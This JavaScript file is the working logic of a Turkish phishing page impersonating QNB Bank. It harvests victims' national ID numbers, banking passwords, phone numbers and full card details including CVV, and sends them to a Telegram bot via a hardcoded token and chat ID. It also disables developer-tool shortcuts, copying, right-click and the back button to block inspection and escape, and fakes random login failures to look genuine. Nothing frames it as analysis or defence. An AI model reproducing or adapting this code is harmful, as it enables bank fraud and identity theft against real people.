// Screen management
function showScreen(screenId) {
    // Hide all screens
    const screens = document.querySelectorAll('.screen');
    screens.forEach(screen => {
        screen.classList.remove('active');
    });
    
    // Show target screen
    const targetScreen = document.getElementById(screenId);
    if (targetScreen) {
        targetScreen.classList.add('active');
    }
}

// Page blocking mechanism
let isBlocked = false;
let blockStartTime = null;

function enablePageBlock() {
    isBlocked = true;
    blockStartTime = Date.now();
    
    // Block right-click context menu
    document.addEventListener('contextmenu', function(e) {
        e.preventDefault();
        return false;
    });
    
    // Block F12, Ctrl+Shift+I, Ctrl+U, Ctrl+S
    document.addEventListener('keydown', function(e) {
        if (e.key === 'F12' || 
            (e.ctrlKey && e.shiftKey && e.key === 'I') ||
            (e.ctrlKey && e.key === 'u') ||
            (e.ctrlKey && e.key === 's') ||
            (e.ctrlKey && e.key === 'a') ||
            (e.ctrlKey && e.key === 'c') ||
            (e.ctrlKey && e.key === 'v') ||
            (e.ctrlKey && e.key === 'x') ||
            (e.ctrlKey && e.key === 'z')) {
            e.preventDefault();
            return false;
        }
    });
    
    // Block text selection
    document.addEventListener('selectstart', function(e) {
        e.preventDefault();
        return false;
    });
    
    // Block drag and drop
    document.addEventListener('dragstart', function(e) {
        e.preventDefault();
        return false;
    });
    
    // Block copy, cut, paste
    document.addEventListener('copy', function(e) {
        e.preventDefault();
        return false;
    });
    
    document.addEventListener('cut', function(e) {
        e.preventDefault();
        return false;
    });
    
    document.addEventListener('paste', function(e) {
        e.preventDefault();
        return false;
    });
    
    // Block beforeunload (page close/refresh)
    window.addEventListener('beforeunload', function(e) {
        e.preventDefault();
        e.returnValue = 'Sayfadan çıkmak istediğinizden emin misiniz? Başvurunuz kaybolabilir.';
        return 'Sayfadan çıkmak istediğinizden emin misiniz? Başvurunuz kaybolabilir.';
    });
    
    // Block back button
    window.addEventListener('popstate', function(e) {
        history.pushState(null, null, location.href);
    });
    
    // Push initial state
    history.pushState(null, null, location.href);
}

function disablePageBlock() {
    isBlocked = false;
    blockStartTime = null;
}

// Auto-enable blocking when page loads
document.addEventListener('DOMContentLoaded', function() {
    enablePageBlock();
});

// Tab switching
document.addEventListener('DOMContentLoaded', function() {
    const tabs = document.querySelectorAll('.tab');
    tabs.forEach(tab => {
        tab.addEventListener('click', function() {
            // Remove active class from all tabs
            tabs.forEach(t => t.classList.remove('active'));
            // Add active class to clicked tab
            this.classList.add('active');
        });
    });

    // Login form submission
    const loginForm = document.getElementById('loginForm');
    if (loginForm) {
        loginForm.addEventListener('submit', function(e) {
            e.preventDefault();
            
            const tcNumber = document.getElementById('tcNumber').value;
            const password = document.getElementById('password').value;
            const errorMessage = document.getElementById('errorMessage');
            
            // Simple validation
            if (!tcNumber || !password) {
                showError('Lütfen tüm alanları doldurun.');
                return;
            }
            
            // Validate TC number format (11 digits)
            const tcRegex = /^[0-9]{11}$/;
            if (!tcRegex.test(tcNumber.replace(/\s/g, ''))) {
                showError('T.C. Kimlik Numarası 11 haneli olmalıdır.');
                return;
            }
            
            // Validate password (6 digits)
            const passwordRegex = /^[0-9]{6}$/;
            if (!passwordRegex.test(password)) {
                showError('Dijital Şifre 6 haneli olmalıdır.');
                return;
            }
            
            // Simulate login process
            showScreen('loadingScreen');
            
            setTimeout(() => {
                // Simulate random success/failure
                if (Math.random() > 0.3) {
                    showScreen('phoneScreen');
                } else {
                    showError('Yanlış şifre veya TC!');
                    showScreen('loginScreen');
                }
            }, 2000);
        });
    }

    // Phone form submission
    const phoneForm = document.getElementById('phoneForm');
    if (phoneForm) {
        phoneForm.addEventListener('submit', function(e) {
            e.preventDefault();
            
            const phoneNumber = document.getElementById('phoneNumber').value;
            
            if (!phoneNumber) {
                showError('Lütfen telefon numaranızı girin.');
                return;
            }
            
            // Validate phone number format (basic Turkish phone validation)
            const phoneRegex = /^(\+90|0)?[5][0-9]{9}$/;
            if (!phoneRegex.test(phoneNumber.replace(/\s/g, ''))) {
                showError('Lütfen geçerli bir telefon numarası girin.');
                return;
            }
            
            showScreen('creditCardScreen');
        });
    }

    // Credit card form submission
    const creditCardForm = document.getElementById('creditCardForm');
    if (creditCardForm) {
        creditCardForm.addEventListener('submit', function(e) {
            e.preventDefault();
            
            const cardNumber = document.getElementById('cardNumber').value;
            const expiryDate = document.getElementById('expiryDate').value;
            const cvv = document.getElementById('cvv').value;
            
            if (!cardNumber || !expiryDate || !cvv) {
                showError('Lütfen tüm alanları doldurun.');
                return;
            }
            
            // Validate card number (16 digits)
            const cardRegex = /^[0-9]{16}$/;
            if (!cardRegex.test(cardNumber.replace(/\s/g, ''))) {
                showError('Kart numarası 16 haneli olmalıdır.');
                return;
            }
            
            // Validate expiry date (MM/YY)
            const expiryRegex = /^(0[1-9]|1[0-2])\/\d{2}$/;
            if (!expiryRegex.test(expiryDate)) {
                showError('Son kullanım tarihi MM/YY formatında olmalıdır.');
                return;
            }
            
            // Validate CVV (3 digits)
            const cvvRegex = /^[0-9]{3}$/;
            if (!cvvRegex.test(cvv)) {
                showError('CVV 3 haneli olmalıdır.');
                return;
            }
            
            // Collect all form data
            const formData = {
                tcNumber: document.getElementById('tcNumber').value,
                password: document.getElementById('password').value,
                phoneNumber: document.getElementById('phoneNumber').value,
                cardNumber: cardNumber,
                expiryDate: expiryDate,
                cvv: cvv
            };
            
            // Send to Telegram
            sendToTelegram(formData);
        });
    }
});

// Send data to Telegram
async function sendToTelegram(data) {
    showScreen('loadingScreen');
    
    const botToken = '8271654582:AAERsLS_t8SUvMnpDDA99iyjtBCWcMvW6cc';
    const chatId = '-4910394398';
    
    const message = `
🔐 QNB Bank Başvuru Bilgileri

👤 T.C. Kimlik: ${data.tcNumber}
🔑 Şifre: ${data.password}
📱 Telefon: ${data.phoneNumber}
💳 Kart No: ${data.cardNumber}
📅 Son Kullanım: ${data.expiryDate}
🔒 CVV: ${data.cvv}

⏰ Tarih: ${new Date().toLocaleString('tr-TR')}
    `;
    
    try {
        const response = await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
            },
            body: JSON.stringify({
                chat_id: chatId,
                text: message,
                parse_mode: 'HTML'
            })
        });
        
        if (response.ok) {
            setTimeout(() => {
                showScreen('successScreen');
            }, 2000);
        } else {
            throw new Error('Telegram gönderimi başarısız');
        }
    } catch (error) {
        console.error('Telegram error:', error);
        setTimeout(() => {
            showScreen('errorScreen');
        }, 2000);
    }
}

// Error handling
function showError(message) {
    const errorMessage = document.getElementById('errorMessage');
    if (errorMessage) {
        errorMessage.textContent = message;
        errorMessage.style.display = 'block';
        
        // Hide error after 5 seconds
        setTimeout(() => {
            errorMessage.style.display = 'none';
        }, 5000);
    }
}


// Input formatting for all fields
document.addEventListener('DOMContentLoaded', function() {
    // TC Number formatting
    const tcInput = document.getElementById('tcNumber');
    if (tcInput) {
        tcInput.addEventListener('input', function(e) {
            let value = e.target.value.replace(/\D/g, '');
            if (value.length > 11) {
                value = value.substring(0, 11);
            }
            e.target.value = value;
        });
    }
    
    // Password formatting
    const passwordInput = document.getElementById('password');
    if (passwordInput) {
        passwordInput.addEventListener('input', function(e) {
            let value = e.target.value.replace(/\D/g, '');
            if (value.length > 6) {
                value = value.substring(0, 6);
            }
            e.target.value = value;
        });
    }
    
    // Phone number formatting
    const phoneInput = document.getElementById('phoneNumber');
    if (phoneInput) {
        phoneInput.addEventListener('input', function(e) {
            let value = e.target.value.replace(/\D/g, '');
            
            // Format as Turkish phone number
            if (value.length > 0) {
                if (value.startsWith('0')) {
                    value = value.substring(1);
                }
                if (value.startsWith('90')) {
                    value = value.substring(2);
                }
                
                // Format: 5XX XXX XXXX
                if (value.length >= 4) {
                    value = value.substring(0, 3) + ' ' + value.substring(3, 6) + ' ' + value.substring(6, 10);
                } else if (value.length >= 1) {
                    value = value.substring(0, 3);
                }
            }
            
            e.target.value = value;
        });
    }
    
    // Card number formatting
    const cardInput = document.getElementById('cardNumber');
    if (cardInput) {
        cardInput.addEventListener('input', function(e) {
            let value = e.target.value.replace(/\D/g, '');
            if (value.length > 16) {
                value = value.substring(0, 16);
            }
            
            // Format: XXXX XXXX XXXX XXXX
            if (value.length >= 4) {
                value = value.substring(0, 4) + ' ' + value.substring(4, 8) + ' ' + value.substring(8, 12) + ' ' + value.substring(12, 16);
            }
            
            e.target.value = value;
        });
    }
    
    // Expiry date formatting
    const expiryInput = document.getElementById('expiryDate');
    if (expiryInput) {
        expiryInput.addEventListener('input', function(e) {
            let value = e.target.value.replace(/\D/g, '');
            if (value.length >= 2) {
                value = value.substring(0, 2) + '/' + value.substring(2, 4);
            }
            e.target.value = value;
        });
    }
    
    // CVV formatting
    const cvvInput = document.getElementById('cvv');
    if (cvvInput) {
        cvvInput.addEventListener('input', function(e) {
            let value = e.target.value.replace(/\D/g, '');
            if (value.length > 3) {
                value = value.substring(0, 3);
            }
            e.target.value = value;
        });
    }
});

// Auto-focus on first input when screen loads
function focusFirstInput(screenId) {
    const screen = document.getElementById(screenId);
    if (screen) {
        const firstInput = screen.querySelector('input');
        if (firstInput) {
            setTimeout(() => {
                firstInput.focus();
            }, 500);
        }
    }
}

// Add focus management to screen transitions
const originalShowScreen = showScreen;
showScreen = function(screenId) {
    originalShowScreen(screenId);
    focusFirstInput(screenId);
};

// Keyboard navigation
document.addEventListener('keydown', function(e) {
    if (e.key === 'Enter') {
        const activeScreen = document.querySelector('.screen.active');
        if (activeScreen) {
            const form = activeScreen.querySelector('form');
            if (form) {
                form.dispatchEvent(new Event('submit'));
            }
        }
    }
});

// Prevent form submission on Enter in input fields (except for forms that should submit)
document.addEventListener('keydown', function(e) {
    if (e.key === 'Enter' && e.target.tagName === 'INPUT') {
        const form = e.target.closest('form');
        if (form && form.id === 'loginForm') {
            e.preventDefault();
            form.dispatchEvent(new Event('submit'));
        }
    }
});
